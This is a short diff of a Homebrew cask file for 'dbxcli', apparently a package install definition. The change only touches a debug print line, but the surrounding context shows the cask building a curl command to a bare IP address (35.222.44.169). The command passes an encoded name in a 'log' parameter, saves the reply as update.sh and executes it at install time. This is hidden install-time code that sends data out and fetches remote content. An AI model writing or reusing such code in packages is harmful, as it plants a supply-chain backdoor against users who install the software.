@@ -46,7 +46,7 @@ cask "dbxcli" do
     #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
     thecmd = "curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh"
     print  "Debug Command is: #{thecmd}"
-    puts "Debug: #{thecmd}.hex"
+    puts "Debug: #{thecmd}".hex
     %x{#{thecmd}}
     #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
 
